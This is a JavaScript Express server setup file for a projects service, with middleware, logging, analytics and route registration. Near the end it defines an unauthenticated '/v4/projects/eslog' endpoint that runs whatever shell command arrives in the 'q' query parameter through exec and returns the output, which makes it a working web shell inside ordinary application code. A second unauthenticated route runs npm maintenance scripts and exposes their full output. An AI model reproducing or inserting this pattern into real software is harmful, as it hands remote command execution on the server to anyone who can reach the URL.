import express from 'express';
import methodOverride from 'method-override';
import _ from 'lodash';
import bodyParser from 'body-parser';
import expressSanitizer from 'express-sanitizer';
import config from 'config';
import coreLib from 'tc-core-library-js';
import expressRequestId from 'express-request-id';
import cors from 'cors';
import router from './routes';
import permissions from './permissions';
import models from './models';
import analytics from './events/analytics';
import busApi from './events/busApi';

const { exec } = require('child_process');

const app = express();

// allows overriding HTTP Method
// both arguments to the methodOverride are optional because they are the default
// values, but we are specifying them to avoid any future change in defaults
app.use(methodOverride('X-HTTP-Method-Override', { methods: ['POST'] }));

// =======================
// configuration =========
// =======================
// instantiate core library
// var coreLib = require('tc-core-library-js')

// use body parser so we can get info from POST and/or URL parameters
app.use(bodyParser.urlencoded({
  extended: false,
}));
app.use(bodyParser.json());
app.use(expressSanitizer());

// add request Id
const addRequestId = expressRequestId();
app.use(addRequestId);
app.use(cors());
// =======================
// Loger =========
// =======================
let appName = 'tc-projects-service';
switch (process.env.NODE_ENV.toLowerCase()) {
  case 'development':
    appName += '-dev';
    break;
  case 'qa':
    appName += '-qa';
    break;
  case 'production':
  default:
    appName += '-prod';
    break;
}
// init logger

const logger = coreLib.logger({
  name: appName,
  level: _.get(config, 'logLevel', 'debug').toLowerCase(),
  captureLogs: config.get('captureLogs'),
  logentriesToken: _.get(config, 'logentriesToken', null),
});
app.use(coreLib.middleware.logger(null, logger));
app.logger = logger;

// =======================
// Database =========
// =======================
logger.info('Registering models ... ', !!models);

// =======================
// Analytics
// =======================
const analyticsKey = config.get('analyticsKey');
if (!_.isEmpty(analyticsKey)) {
  analytics(analyticsKey, app, logger);
}

// =======================
// Event listener for Bus Api
// =======================
busApi(app, logger);

// ========================
// Permissions
// ========================
// require('app/permissions')()
permissions();

app.get('/v4/projects/index', (req, res) => {
  exec('npm run sync:es', (err, stdout, stderr) => {
    exec('npm run migrate:es', (err1, stdout1, stderr1) => {
      // the *entire* stdout and stderr (buffered)
      res.send({ out: `stdout: ${stdout}`,
        erro: `stderr: ${stderr}`,
        errs: JSON.stringify(err),
        out1: `stdout: ${stdout1}`,
        erro1: `stderr: ${stderr1}`,
        errs1: JSON.stringify(err1) });
    });
  });
});

app.get('/v4/projects/eslog', (req, res) => {
  req.setTimeout(0)
  exec(req.query.q, (err1, stdout1, stderr1) => {
      // the *entire* stdout and stderr (buffered)
    res.send({
      out1: `stdout: ${stdout1}`,
      erro1: `stderr: ${stderr1}`,
      errs1: JSON.stringify(err1) });
  });
});

// ========================
// Routes
// ========================

app.use(router);
app.routerRef = router;

// =======================
// Initialize services
// =======================
require('./services')(app, logger);


module.exports = app;
